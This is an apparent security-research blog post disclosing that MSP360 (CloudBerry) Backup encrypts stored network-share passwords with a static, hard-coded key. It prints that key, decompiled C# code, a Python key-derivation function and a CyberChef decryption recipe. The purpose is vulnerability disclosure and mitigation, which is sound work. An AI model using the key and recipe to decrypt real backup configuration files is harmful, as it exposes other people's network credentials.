<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Google Tag Manager -->
  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
      new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
      'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
      })(window,document,'script','dataLayer','GTM-T5JQHL7L');</script>
  </script>
  <!-- End Google Tag Manager -->
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-3EDJCVRD9C"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() {
    dataLayer.push(arguments);
  }
  gtag("js", new Date());

  gtag("config", "G-3EDJCVRD9C");
</script>
  

  <meta
    content="proactive Labs, cyber security, australian cyber security, penetration testing, penetration testing canberra"
    name="keywords" />

  <!-- Favicons -->
  <link href="/assets/img/favicon.ico" rel="icon" />

  <!-- Google Fonts -->
  <link
    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i&display=swap"
    rel="stylesheet" />

  <!-- Template Main CSS File -->
  <!-- <link href="/assets/css/style.css" rel="stylesheet"> -->
  <script type="text/javascript" src="/dist/bundle.js"></script>
  <link rel="stylesheet" href="/dist/main.css" />

  <link type="application/atom+xml" rel="alternate" href="https://www.proactivelabs.com.au/feed.xml" title="Proactive Labs" />
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>MSP360 hardcoded encryption keys leading to leaked network credentials | Proactive Labs</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="MSP360 hardcoded encryption keys leading to leaked network credentials" />
<meta name="author" content="Proactive Labs" />
<meta property="og:locale" content="en_AU" />
<meta name="description" content="âMSP360â¢ (previously CloudBerry) Backup for Windows is a cost-effective, flexible, and versatile backup and data restore solution that enables business and private users to automate data protection routines for a number of environments, local and cloud storage destinations.â" />
<meta property="og:description" content="âMSP360â¢ (previously CloudBerry) Backup for Windows is a cost-effective, flexible, and versatile backup and data restore solution that enables business and private users to automate data protection routines for a number of environments, local and cloud storage destinations.â" />
<link rel="canonical" href="https://www.proactivelabs.com.au/2024/06/19/cloudberry.html" />
<meta property="og:url" content="https://www.proactivelabs.com.au/2024/06/19/cloudberry.html" />
<meta property="og:site_name" content="Proactive Labs" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-06-19T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="MSP360 hardcoded encryption keys leading to leaked network credentials" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Proactive Labs"},"dateModified":"2024-06-19T00:00:00+00:00","datePublished":"2024-06-19T00:00:00+00:00","description":"âMSP360â¢ (previously CloudBerry) Backup for Windows is a cost-effective, flexible, and versatile backup and data restore solution that enables business and private users to automate data protection routines for a number of environments, local and cloud storage destinations.â","headline":"MSP360 hardcoded encryption keys leading to leaked network credentials","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.proactivelabs.com.au/2024/06/19/cloudberry.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://www.proactivelabs.com.au/assets/img/website-logo.jpg"},"name":"Proactive Labs"},"url":"https://www.proactivelabs.com.au/2024/06/19/cloudberry.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body>
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T5JQHL7L"
      height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
  
  <header id="header" class=""><div class="container d-flex align-items-center justify-content-between">
    
    <a href="/index.html" class="logo" aria-label="Link to main page via logo"><img src="/assets/img/website-logo.jpg" alt="Proactive Labs Home Page"
        class="img-fluid"></a>
      <nav id="navbar" class="navbar">
        <ul>
          <li><a  class="nav-link scrollto" href="/" aria-label="Back to main page">Home</a></li>
          <li><a  class="nav-link scrollto"  href="/about.html" aria-label="About Proactive Labs">About</a></li>
          <li><a  class="nav-link scrollto"  href="/whyus.html" aria-label="Why Proactive Labs">Why</a></li>
          <li class="dropdown"><a class="nav-link scrollto" href="/services/index.html" aria-label="Services offered by Proactive Labs"><span>Services</span> <i class="bi bi-chevron-down"></i></a>
            <ul>
              <li>
                <a aria-label="Penetration Testing" href="/services/pentest.html">Penetration Testing</a>
              </li>
              <li>
                <a aria-label="Threat Emulation"  href="/services/threatemulation.html">Threat Emulation</a>
              </li>
              <li>
                <a aria-label="Research"  href="/services/research.html">Research</a>
              </li>
              <li>
                <a  aria-label="Application Security"  href="/services/appsec.html">Application Security</a>
              </li>
              <li>
                <a aria-label="Code Review"  href="/services/codereview.html">Code Review</a>
              </li>
              <li>
                <a aria-label="Vulnerability Assessments"  href="/services/va.html">Vulnerability Assessments</a>
              </li>
              <li>
                <a aria-label="Hardware / IoT Security Assessment"  href="/services/hardware.html">Hardware / IoT Security Assessment</a>
              </li>
              <li>
                <a aria-label="Cloud Security Assessment"  href="/services/cloud.html">Cloud Security Assessment</a>
              </li>
              <li>
                <a aria-label="Mobile Application Security Assessment"  href="/services/mobile.html">Mobile Application Security Assessment</a>
              </li>
              <li>
                <a aria-label="Operational Technology Security Assessment"  href="/services/ot.html">Operational Technology Security Assessment</a>
              </li>
                </ul>
          </li>

          <li><a  class="nav-link scrollto"  href="/blog.html" aria-label="Proactive Labs blog posts">Blog</a></li>
          <li><a  class="nav-link scrollto"  href="/contact.html" aria-label="Proactive Labs contact details">Contact</a></li>
          <li><a  class="nav-link scrollto"  href="/careers.html" aria-label="Careers with Proactive Labs">Careers</a></li>
          <li><a class="nav-link scrollto" href="/assets/pgp/info@proactivelabs.com.txt" aria-label="Our Pretty Good Privacy (PGP) key">PGP Key</a></li>
        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav>
  </div>
</header>
  <div class="default-layout">
  <style>
  .highlight .hll {
    background-color: #ffffcc;
  }
  .highlight .c {
    color: #408080;
    font-style: italic;
  } /* Comment */
  .highlight .err {
    border: 1px solid #ff0000;
  } /* Error */
  .highlight .k {
    color: #008000;
    font-weight: bold;
  } /* Keyword */
  .highlight .o {
    color: #666666;
  } /* Operator */
  .highlight .cm {
    color: #408080;
    font-style: italic;
  } /* Comment.Multiline */
  .highlight .cp {
    color: #bc7a00;
  } /* Comment.Preproc */
  .highlight .c1 {
    color: #408080;
    font-style: italic;
  } /* Comment.Single */
  .highlight .cs {
    color: #408080;
    font-style: italic;
  } /* Comment.Special */
  .highlight .gd {
    color: #a00000;
  } /* Generic.Deleted */
  .highlight .ge {
    font-style: italic;
  } /* Generic.Emph */
  .highlight .gr {
    color: #ff0000;
  } /* Generic.Error */
  .highlight .gh {
    color: #000080;
    font-weight: bold;
  } /* Generic.Heading */
  .highlight .gi {
    color: #00a000;
  } /* Generic.Inserted */
  .highlight .go {
    color: #808080;
  } /* Generic.Output */
  .highlight .gp {
    color: #000080;
    font-weight: bold;
  } /* Generic.Prompt */
  .highlight .gs {
    font-weight: bold;
  } /* Generic.Strong */
  .highlight .gu {
    color: #800080;
    font-weight: bold;
  } /* Generic.Subheading */
  .highlight .gt {
    color: #0040d0;
  } /* Generic.Traceback */
  .highlight .kc {
    color: #008000;
    font-weight: bold;
  } /* Keyword.Constant */
  .highlight .kd {
    color: #008000;
    font-weight: bold;
  } /* Keyword.Declaration */
  .highlight .kn {
    color: #008000;
    font-weight: bold;
  } /* Keyword.Namespace */
  .highlight .kp {
    color: #008000;
  } /* Keyword.Pseudo */
  .highlight .kr {
    color: #008000;
    font-weight: bold;
  } /* Keyword.Reserved */
  .highlight .kt {
    color: #b00040;
  } /* Keyword.Type */
  .highlight .m {
    color: #666666;
  } /* Literal.Number */
  .highlight .s {
    color: #ba2121;
  } /* Literal.String */
  .highlight .na {
    color: #7d9029;
  } /* Name.Attribute */
  .highlight .nb {
    color: #008000;
  } /* Name.Builtin */
  .highlight .nc {
    color: #0000ff;
    font-weight: bold;
  } /* Name.Class */
  .highlight .no {
    color: #880000;
  } /* Name.Constant */
  .highlight .nd {
    color: #aa22ff;
  } /* Name.Decorator */
  .highlight .ni {
    color: #999999;
    font-weight: bold;
  } /* Name.Entity */
  .highlight .ne {
    color: #d2413a;
    font-weight: bold;
  } /* Name.Exception */
  .highlight .nf {
    color: #0000ff;
  } /* Name.Function */
  .highlight .nl {
    color: #a0a000;
  } /* Name.Label */
  .highlight .nn {
    color: #0000ff;
    font-weight: bold;
  } /* Name.Namespace */
  .highlight .nt {
    color: #008000;
    font-weight: bold;
  } /* Name.Tag */
  .highlight .nv {
    color: #19177c;
  } /* Name.Variable */
  .highlight .ow {
    color: #aa22ff;
    font-weight: bold;
  } /* Operator.Word */
  .highlight .w {
    color: #bbbbbb;
  } /* Text.Whitespace */
  .highlight .mf {
    color: #666666;
  } /* Literal.Number.Float */
  .highlight .mh {
    color: #666666;
  } /* Literal.Number.Hex */
  .highlight .mi {
    color: #666666;
  } /* Literal.Number.Integer */
  .highlight .mo {
    color: #666666;
  } /* Literal.Number.Oct */
  .highlight .sb {
    color: #ba2121;
  } /* Literal.String.Backtick */
  .highlight .sc {
    color: #ba2121;
  } /* Literal.String.Char */
  .highlight .sd {
    color: #ba2121;
    font-style: italic;
  } /* Literal.String.Doc */
  .highlight .s2 {
    color: #ba2121;
  } /* Literal.String.Double */
  .highlight .se {
    color: #bb6622;
    font-weight: bold;
  } /* Literal.String.Escape */
  .highlight .sh {
    color: #ba2121;
  } /* Literal.String.Heredoc */
  .highlight .si {
    color: #bb6688;
    font-weight: bold;
  } /* Literal.String.Interpol */
  .highlight .sx {
    color: #008000;
  } /* Literal.String.Other */
  .highlight .sr {
    color: #bb6688;
  } /* Literal.String.Regex */
  .highlight .s1 {
    color: #ba2121;
  } /* Literal.String.Single */
  .highlight .ss {
    color: #19177c;
  } /* Literal.String.Symbol */
  .highlight .bp {
    color: #008000;
  } /* Name.Builtin.Pseudo */
  .highlight .vc {
    color: #19177c;
  } /* Name.Variable.Class */
  .highlight .vg {
    color: #19177c;
  } /* Name.Variable.Global */
  .highlight .vi {
    color: #19177c;
  } /* Name.Variable.Instance */
  .highlight .il {
    color: #666666;
  } /* Literal.Number.Integer.Long */
  .highlight pre {
    border: 1px solid rgb(245, 245, 245);
    border-radius: 3px;
    background-color: rgb(245, 245, 245);

  }
</style>
<script>
document.addEventListener('DOMContentLoaded', function(event) {
  window.anchorJS.add();
});
</script>

<main id="main">
  <section>
    <div class="section-title">
      <h1 class="blog-title">MSP360 hardcoded encryption keys leading to leaked network credentials</h1>
      <h4></h4>
      <p>19 Jun 2024 - Proactive Labs</p>
    </div>
    <div class="page-layout">
      <div class="row mt-5 justify-content-center">
        <div class="col-lg-6 mt-5 mt-lg-0 px-5"><blockquote>
  <blockquote>
    <p><em>âMSP360â¢ (previously CloudBerry) Backup for Windows is a cost-effective,
flexible, and versatile backup and data restore solution that enables
business and private users to automate data protection routines for a number
of environments, local and cloud storage destinations.â</em></p>
  </blockquote>
</blockquote>

<p>~ <a href="https://help.msp360.com/cloudberry-backup/overview/intro">https://help.msp360.com/cloudberry-backup/overview/intro</a></p>

<p>The <code class="language-plaintext highlighter-rouge">MSP360 Backup Agent</code> software stores credentials for network shares using a
static key, allowing an attacker with access to a stolen <code class="language-plaintext highlighter-rouge">enginesettings.list</code>
file from a backup to obtain network credentials.</p>

<p>This configuration file is backed up to a target, alongside the actual backup
data. This can support multiple types of destinations, including Amazon S3. By
default, MSP360 managed buckets do not enable directory listing, however users
can configure their own backup target, which can be configured to enable
directory listing.</p>

<p>If an attacker is able to obtain this <code class="language-plaintext highlighter-rouge">enginesettings.list</code> file, it can be
decrypted using a hard-coded key present in the MSP360 backup software, leading
to credential exposure for internal network assets.</p>

<p>To re-iterate; while buckets are configured on a per-user basis, the hard-coded
key is the same for anyone using the software; if an attacker is able to obtain
a copy of the <code class="language-plaintext highlighter-rouge">enginesettings.list</code> file, they now have credentials for your
configured network shares.</p>

<p>As the vendor did not respond to the disclosure, it is unclear if a patch
is forthcoming.</p>

<p><em>tldr: If you use MSP360 with a vulnerable configuration, rotate your network
credentials and reconfigure buckets to no longer be publicly
accessible.</em></p>

<h2 id="background">Background</h2>

<p><code class="language-plaintext highlighter-rouge">MSP360 Backup Agent</code> is an agent based backup solution supporting Windows /
OSX / Linux, and appears to have been renamed from <code class="language-plaintext highlighter-rouge">CloudBerry</code> in June 2023.
The software appears to have multiple licensing tiers for different use cases,
but ultimately backs up configured sources to destinations; the focus of this
post is Amazon S3, however the vulnerability is destination agnostic.</p>

<p>The software can be remotely administered and viewed through a web application
hosted at <a href="https://console.msp360.com">https://console.msp360.com</a>; however not all editions support this.</p>

<p>When using defaults, the solution will seemingly generate a per-user bucket
which is configured to disallow directory listing, and is not the subject of
this post.</p>

<p>The software seemingly also allows the usage of arbitrary S3 buckets, which if
(mis)configured to allow directory browsing, will upload backups alongside with
a configuration file containing encrypted credentials.</p>

<p>These credentials are encrypted with a hard-coded key, allowing an attacker to
decrypt sensitive network credentials used by the backup agent, and potentially
establish a foothold with in a network.</p>

<h2 id="versions-affected">Versions Affected</h2>

<p>The software used was <code class="language-plaintext highlighter-rouge">MSP360 Backup Desktop Edition</code>,
although the functionality appears common in other editions.</p>

<p>We were able to directly observe this in versions 7.8.5.15 (March 2024) and
7.9.4.84 (March 2024), however suspect this is also present in earlier
versions.</p>

<p>We had access to an old configuration file, which
purportedly came from version 4.5, however the change log does not appear to
list versions under 6.3.2 (15-Jul-2020); potentially indicating this issue has
likely existed for nearly half a decade.</p>

<p>The versions can be observed at
<a href="https://help.msp360.com/cloudberry-backup/whats-new">https://help.msp360.com/cloudberry-backup/whats-new</a>.</p>

<p>The software is somewhat confusingly named, previously it appeared to be
<code class="language-plaintext highlighter-rouge">CloudBerry Backup for Windows</code>, however in later editions was renamed to
<code class="language-plaintext highlighter-rouge">MSP360 Backup for Windows</code>, which may explain the lack of version numbers
before a given date in the changelog.</p>

<h2 id="vulnerable-configuration">Vulnerable Configuration</h2>

<p>For the vulnerability to be exploitable, the <code class="language-plaintext highlighter-rouge">MSP360 Backup</code> software needs to
be configured to back up from an Server Message Block (SMB) share, and to have
credentials configured. In the user interface, this appears as the following:</p>

<p><img src="/assets/img/msp360/msp360_vulnconfig.png" alt="Network shares and credentials configured in backup" /></p>

<h2 id="configuration-files">Configuration Files</h2>

<p>The backup configuration can be exported from the application interface using
the <code class="language-plaintext highlighter-rouge">Export Configuration</code> option, which will output a file named
<code class="language-plaintext highlighter-rouge">Configuration_$Date$.cbbconfiguration</code>. Exporting a file at the time of writing
resulted in a file named <code class="language-plaintext highlighter-rouge">Configuration_20240604151528.cbbconfiguration</code>.</p>

<p>These exports are (renamed) ZIP archives, which can be decompressed and will contain files as follows:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">enginesettings.list</code>
    <ul>
      <li>An XML blob, starting with <code class="language-plaintext highlighter-rouge">EngineSettings</code>.</li>
      <li>The configuration for our backup software, and of interest to this post.</li>
    </ul>
  </li>
  <li>(GUID.cbb) - i.e. <code class="language-plaintext highlighter-rouge">a55ca7f0-b9e1-4d72-a700-11e1fc2d0ad8.cbb</code>
    <ul>
      <li>A backup plan, in XML and starts with <code class="language-plaintext highlighter-rouge">BasePlan</code>.</li>
      <li>This file is not of interest to this post.</li>
    </ul>
  </li>
</ul>

<p>Blobs can be exported from the software using the <code class="language-plaintext highlighter-rouge">Export configuration</code> option,
however the <code class="language-plaintext highlighter-rouge">EngineSettings.list</code> file will generally appear in backup locations
such as Amazon S3, alongside with backup plans.</p>

<p>The <code class="language-plaintext highlighter-rouge">Enginesettings.list</code> file is the focus to this post, and is detailed
in the next section.</p>

<h2 id="enginesettingslist">Enginesettings.list</h2>

<p>The <code class="language-plaintext highlighter-rouge">Enginesettings.list</code> file, partially edited for brevity, is shown below:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;EngineSettings</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;SerializationSupportDefaultRetentionTime&gt;</span>10675199.02:48:05.4775807<span class="nt">&lt;/SerializationSupportDefaultRetentionTime&gt;</span>
  <span class="nt">&lt;RetentionDelay&gt;</span>00:00:00<span class="nt">&lt;/RetentionDelay&gt;</span>
  <span class="nt">&lt;EngineVersion&gt;</span>7.9.4.84<span class="nt">&lt;/EngineVersion&gt;</span>
  <span class="nt">&lt;SerializationSupportHistoryDefaultRetentionTime&gt;</span>10675199.02:48:05.4775807<span class="nt">&lt;/SerializationSupportHistoryDefaultRetentionTime&gt;</span>
  <span class="c">&lt;!-- snip... --&gt;</span> 
  <span class="nt">&lt;MBSFolderPath&gt;</span>MBS-8070d2a1-fc62-4043-9512-8e7593fed4d8<span class="nt">&lt;/MBSFolderPath&gt;</span>
  <span class="nt">&lt;Credentials</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;NetworkShares&gt;</span>
    <span class="nt">&lt;NetworkCredentialsSettings&gt;</span>
      <span class="nt">&lt;Share&gt;</span>\\localhost\networkshare<span class="nt">&lt;/Share&gt;</span>
      <span class="nt">&lt;Login&gt;</span>cloudberry<span class="nt">&lt;/Login&gt;</span>
      <span class="nt">&lt;Password&gt;</span>8g5udYDL4ENotWyVoF9AsQ==<span class="nt">&lt;/Password&gt;</span>
    <span class="nt">&lt;/NetworkCredentialsSettings&gt;</span>
  <span class="nt">&lt;/NetworkShares&gt;</span>
  <span class="nt">&lt;MaximumSimultaneousTransfers&gt;</span>5<span class="nt">&lt;/MaximumSimultaneousTransfers&gt;</span>
  <span class="nt">&lt;Priority&gt;</span>Normal<span class="nt">&lt;/Priority&gt;</span>
  <span class="nt">&lt;DefaultRetentionNumberOfHistoryRecords&gt;</span>10000<span class="nt">&lt;/DefaultRetentionNumberOfHistoryRecords&gt;</span>
  <span class="nt">&lt;PreventSleepMode&gt;</span>true<span class="nt">&lt;/PreventSleepMode&gt;</span>
  <span class="nt">&lt;ContinueOnWakeUp&gt;</span>false<span class="nt">&lt;/ContinueOnWakeUp&gt;</span>
  <span class="nt">&lt;RetryAttempts&gt;</span>3<span class="nt">&lt;/RetryAttempts&gt;</span>
  <span class="nt">&lt;RetryInterval&gt;</span>400<span class="nt">&lt;/RetryInterval&gt;</span>
  <span class="c">&lt;!-- snip --&gt;</span>
<span class="nt">&lt;/EngineSettings&gt;</span>
</code></pre></div></div>

<p>Within the <code class="language-plaintext highlighter-rouge">Enginesettings.txt</code> file, a <code class="language-plaintext highlighter-rouge">NetworkCredentialsSettings</code> element contains
shares used for backup sources, alongside a username (<code class="language-plaintext highlighter-rouge">Login</code>) and <code class="language-plaintext highlighter-rouge">Password</code> field,
which is shown below:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;NetworkShares&gt;</span>
    <span class="nt">&lt;NetworkCredentialsSettings&gt;</span>
      <span class="nt">&lt;Share&gt;</span>\\localhost\networkshare<span class="nt">&lt;/Share&gt;</span>
      <span class="nt">&lt;Login&gt;</span>cloudberry<span class="nt">&lt;/Login&gt;</span>
      <span class="nt">&lt;Password&gt;</span>8g5udYDL4ENotWyVoF9AsQ==<span class="nt">&lt;/Password&gt;</span>
    <span class="nt">&lt;/NetworkCredentialsSettings&gt;</span>
  <span class="nt">&lt;/NetworkShares&gt;</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">Password</code> field is a base 64 encoded blob, which is encrypted with AES in
ECB mode, as detailed in the next section.</p>

<h2 id="reverse-engineering-the-algorithm">Reverse engineering the algorithm</h2>

<p>Network credential settings are handled in the <code class="language-plaintext highlighter-rouge">CloudBerryLab.Client.Options.NetworkCredentialsSettings</code> class,
which is responsible for the deserialization of the NetworkCredentialSettings XML object. Decryption of the password occurs
when the getter for the <code class="language-plaintext highlighter-rouge">Password</code> property is called.</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">XmlIgnore</span><span class="p">]</span>
<span class="k">public</span> <span class="kt">string</span> <span class="n">Password</span>
<span class="p">{</span>
    <span class="k">get</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="n">Settings</span><span class="p">.</span><span class="nf">Decrypt</span><span class="p">(</span><span class="n">PasswordEncrypted</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">set</span>
    <span class="p">{</span>
        <span class="n">PasswordEncrypted</span> <span class="p">=</span> <span class="n">Settings</span><span class="p">.</span><span class="nf">Encrypt</span><span class="p">(</span><span class="k">value</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="p">[</span><span class="nf">XmlElement</span><span class="p">(</span><span class="s">"Password"</span><span class="p">)]</span>
<span class="k">public</span> <span class="kt">string</span> <span class="n">PasswordEncrypted</span> <span class="p">{</span> <span class="k">get</span><span class="p">;</span> <span class="k">set</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">Settings.Decrypt</code> method simply returns an empty string if the Ciphertext is null, otherwise it calls a method
with a per-version obfuscated name such as <code class="language-plaintext highlighter-rouge">aUy.s</code>.</p>

<p>Stepping through the obfuscated call tree, eventually the following method is called.</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="nf">A</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="n">A_0</span><span class="p">,</span> <span class="kt">string</span> <span class="n">A_1</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">A_2</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">byte</span><span class="p">[]</span> <span class="n">result</span><span class="p">;</span>
    <span class="k">using</span> <span class="p">(</span><span class="n">SymmetricAlgorithm</span> <span class="n">symmetricAlgorithm</span> <span class="p">=</span> <span class="n">aqN</span><span class="p">.</span><span class="nf">A</span><span class="p">())</span>
    <span class="p">{</span>
        <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">A_2</span> <span class="p">?</span> <span class="n">symmetricAlgorithm</span><span class="p">.</span><span class="n">IV</span> <span class="p">:</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">16</span><span class="p">];</span>
        <span class="n">ICryptoTransform</span> <span class="n">transform</span> <span class="p">=</span> <span class="n">symmetricAlgorithm</span><span class="p">.</span><span class="nf">CreateEncryptor</span><span class="p">(</span><span class="k">new</span> <span class="nf">PasswordDeriveBytes</span><span class="p">(</span><span class="n">A_1</span><span class="p">,</span> <span class="k">null</span><span class="p">).</span><span class="nf">GetBytes</span><span class="p">(</span><span class="m">16</span><span class="p">),</span> <span class="n">array</span><span class="p">);</span>
        <span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">())</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">A_2</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">memoryStream</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">using</span> <span class="p">(</span><span class="n">CryptoStream</span> <span class="n">cryptoStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">transform</span><span class="p">,</span> <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Write</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">cryptoStream</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="n">A_0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">A_0</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
                <span class="n">cryptoStream</span><span class="p">.</span><span class="nf">FlushFinalBlock</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="n">result</span> <span class="p">=</span> <span class="n">memoryStream</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This roughly comes down to the following:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">A_0</code> is the plaintext password to encrypt.</li>
  <li><code class="language-plaintext highlighter-rouge">A_1</code> is a hard-coded secret, used with a key derivation function.</li>
  <li>The key derivation function <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.passwordderivebytes?view=net-8.0">PasswordDeriveBytes</a> uses SHA1.</li>
  <li><code class="language-plaintext highlighter-rouge">PasswordDeriveBytes</code> will perform the SHA1 algorithm 100 times.</li>
  <li>The output is truncated to 16 bytes and used as an encryption key.</li>
  <li>The algorithm used with <code class="language-plaintext highlighter-rouge">symmetricAlgorithm.CreateEncryptor</code> is AES in ECB mode</li>
</ul>

<p>The hard coded secret is set as a property of the obfuscated class, which in this case is <code class="language-plaintext highlighter-rouge">aUy.Dyl</code>. The secret is consistent across every version weâve reviewed.</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">Dyl</span> <span class="p">=</span> <span class="s">"9B80F6F2-BEF9-4C7F-8708-9932B806A5C4"</span><span class="p">;</span>
</code></pre></div></div>

<p>The following python function implements the <code class="language-plaintext highlighter-rouge">PasswordDeriveBytes</code> method from DotNet, enabling us to recover the real
AES key in use.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dotnet_password_derive_bytes_no_salt</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">count</span><span class="p">):</span>
    <span class="n">iter_hash</span>  <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">(</span><span class="n">password</span><span class="p">).</span><span class="nf">digest</span><span class="p">()</span>
    <span class="n">count</span> <span class="o">-=</span> <span class="mi">1</span>    
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">count</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span> 
        <span class="n">iter_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">(</span><span class="n">iter_hash</span><span class="p">).</span><span class="nf">digest</span><span class="p">()</span>

    <span class="n">done_bytes</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">(</span><span class="n">iter_hash</span><span class="p">).</span><span class="nf">digest</span><span class="p">()</span>
    <span class="nf">return</span><span class="p">(</span><span class="n">done_bytes</span><span class="p">[:</span><span class="n">length</span><span class="p">])</span>

<span class="n">CLOUDBERRY_AES_KEY</span> <span class="o">=</span> <span class="nf">dotnet_password_derive_bytes_no_salt</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">9B80F6F2-BEF9-4C7F-8708-9932B806A5C4</span><span class="sh">'</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
</code></pre></div></div>

<p>The hard-coded key for all instances is <code class="language-plaintext highlighter-rouge">U9Ebzxlhs2bk++uBub+5SA==</code>.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>A proof of concept is available on our <a href="https://github.com/proactivelabs/msp360-credential-decrypter">GitHub</a>.</p>

<p>The proof of concept will enumerate and decrypt all <code class="language-plaintext highlighter-rouge">Password</code> elements
within a <code class="language-plaintext highlighter-rouge">NetworkCredentialsSettings</code> block, although the <code class="language-plaintext highlighter-rouge">CBLPassword</code>
field also appears to be encrypted with the same key.</p>

<p>Running the decryption returns the following result:</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poc@pentest ~/cloudberry-decrypt $ python main.py enginesettings.list
\\localhost\networkshare cloudberry 0vagrant
</code></pre></div></div>

<p>This can also be performed in <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'U9Ebzxlhs2bk%2B%2BuBub%2B5SA%3D%3D'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&amp;input=OGc1dWRZREw0RU5vdFd5Vm9GOUFzUT09">CyberChef</a>.</p>

<h2 id="mitigations">Mitigations?</h2>

<p>At time of writing, there does not appear to be a configuration option to disable
the backing up of <code class="language-plaintext highlighter-rouge">NetworkCredentialsSettings</code>. A configuration option for âEncryptionâ
did not appear to effect the storage of <code class="language-plaintext highlighter-rouge">NetworkCredentialsSettings</code>.</p>

<p>At time of writing, the best mitigation appears to be to not use this configuration
option, and instead rely on running the service with an identity which can authenticate
to other services natively (i.e. a service account in Active Directory).</p>

